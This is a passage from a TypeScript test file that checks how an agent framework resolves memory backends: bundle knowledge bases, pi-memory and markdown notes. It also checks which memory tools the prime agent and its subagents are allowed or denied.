  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 1);
  const preamble = resolved.preamble("prime");
  assert.match(preamble, LOADED_STORE);
  assert.match(preamble, DROPPED_NOTICE);
  assert.match(preamble, droppedEntry("gone"));
});

const BUNDLES = mkdtempSync(path.join(tmpdir(), "mem-bundles-"));
after(() => rmSync(BUNDLES, { recursive: true, force: true }));

/** Resolves `binding` for a session created from bundle `bundleId`, if any. */
function resolveForBundle(
  binding: MemoryBinding,
  bundleId: string | undefined,
  root = SESS,
) {
  const resolver = new MemoryResolver(
    new SimpleMdMemory(),
    sessionStoreWith(binding, bundleId),
    async () => [],
    new BundleKbRegistry({ root: BUNDLES }),
  );
  return resolver.resolve("s1", root);
}

test("a bundle-kb leaf resolves into its bundle's store, writes Prime-only", async () => {
  const resolved = await resolveForBundle({ kind: "bundle-kb" }, "research");

  const prime = resolved.spawnPlan("prime");
  assert.ok(prime.allowlistTools.includes("kb_write"));
  assert.ok(prime.allowlistTools.includes("kb_search"));
  const sub = resolved.spawnPlan("subagent");
  assert.ok(sub.allowlistTools.includes("kb_read"));
  assert.ok(sub.deniedTools.includes("kb_write"));
  assert.ok(sub.deniedTools.includes("kb_forget"));

  resolved.init();
  const write = await resolved.execute(
    "kb_write",
    { title: "Fact", content: "fact" },
    "prime",
  );
  assert.deepEqual(write?.effects, [
    { kind: "remembered", scope: "bundle", text: "fact" },
  ]);
  assert.match(
    readFileSync(path.join(BUNDLES, "research", "MEMORY.md"), "utf8"),
    /fact/,
  );
  const preamble = resolved.preamble("prime");
  assert.match(preamble, /^- \*\*Bundle knowledge base\*\*/m);
  assert.match(
    preamble,
    /### Bundle knowledge base: MEMORY\.md\n\n<!-- .* -->\n### Fact\nfact/,
  );
});

test("a bundle-kb leaf without a bundle is dropped with a notice", async (t) => {
  t.mock.method(console, "warn", () => {});
  const resolved = await resolveForBundle({ kind: "bundle-kb" }, undefined);

  assert.equal(
    resolved.spawnPlan("prime").allowlistTools.includes("kb_write"),
    false,
  );
  const preamble = resolved.preamble("prime");
  assert.match(preamble, DROPPED_NOTICE);
  assert.match(preamble, droppedEntry("bundle knowledge base"));
});

test("pi-memory and bundle-kb coexist in one composite", async () => {
  const resolved = await resolveForBundle(
    {
      kind: "composite",
      children: [{ kind: "pi-memory" }, { kind: "bundle-kb" }],
    },
    "combo",
    sessionRoot("pi-and-kb"),
  );

  const plan = resolved.spawnPlan("prime");
  assert.equal(plan.extensionPaths.length, 1);
  assert.ok(plan.allowlistTools.includes("memory_write"));
  assert.ok(plan.allowlistTools.includes("kb_write"));
  const preamble = resolved.preamble("prime");
  assert.match(preamble, /^- \*\*Project memory \(pi-memory\)\*\*/m);
  assert.match(preamble, /^- \*\*Bundle knowledge base\*\*/m);
  assert.doesNotMatch(preamble, DROPPED_NOTICE);
});

test("the binding schema allows at most one bundle-kb leaf", () => {
  const two: MemoryBinding = {
    kind: "composite",
    children: [{ kind: "bundle-kb" }, { kind: "bundle-kb" }],
  };
  assert.equal(memoryBindingSchema.safeParse(two).success, false);
  assert.equal(
    memoryBindingSchema.safeParse({
      kind: "composite",
      children: [{ kind: "pi-memory" }, { kind: "bundle-kb" }],
    }).success,
    true,
  );
});

test("settleBinding keeps a bundle-kb leaf", () => {
  const binding: MemoryBinding = { kind: "bundle-kb" };
  assert.deepEqual(settleBinding(binding, "s1", SESS, []), binding);
});

/** Every tool a backend's index entries name for `role`. */
function describedTools(backend: MemoryBackend, role: "prime" | "subagent") {
  return backend
    .describe(CTX, role)
    .flatMap((source) => [source.read, source.write])
    .flatMap((access) => (access && "tools" in access ? access.tools : []));
}

test("every leaf's index names only tools that leaf grants the role", () => {
  const registry = new BundleKbRegistry({ root: BUNDLES });
  const leaves: MemoryBackend[] = [
    new SimpleMdMemory(),
    new PiMemory(PM),
    new PiMemory(PM, { search: false }),
    new BundleKnowledgeMemory(registry.get("guard"), registry),
  ];
  for (const leaf of leaves) {
    for (const role of ["prime", "subagent"] as const) {
      const granted = new Set([
        ...leaf.tools(role).map((tool) => tool.name),
        ...(leaf.spawn?.(CTX, role).allowlistTools ?? []),
      ]);
      for (const tool of describedTools(leaf, role)) {
        assert.ok(granted.has(tool), `${leaf.kind} names ${tool} for ${role}`);
      }
    }
  }
});

test("the resolved index keeps every source of a mixed composite", async (t) => {
  t.mock.method(console, "warn", () => {});
  const root = sessionRoot("index-mixed");
  mkdirSync(path.join(root, "notes"));
  const resolved = await resolveForBundle(
    {
      kind: "composite",
      children: [
        { kind: "pi-memory" },
        { kind: "simple-md", root: "notes" },
        { kind: "simple-md", root: "gone" },
        { kind: "bundle-kb" },
      ],
    },
    "mixed",
    root,
  );

  assert.deepEqual(
    resolved.sources("prime").map((source) => source.title),
    [
      "Global memory",
      "Session memory",
      "Project memory (pi-memory)",
      "Project note",
      "Bundle knowledge base",
      "`gone`",
    ],
  );
  const [, , pi] = resolved.sources("subagent");
  assert.deepEqual(pi.read, { tools: ["memory_search", "memory_read"] });
  assert.equal(pi.write, undefined);
});

test("a rootless simple-md binding adds no notice", async () => {
  const preamble = (await resolveWith({ kind: "simple-md" })).preamble("prime");
  assert.doesNotMatch(preamble, DROPPED_NOTICE);
});
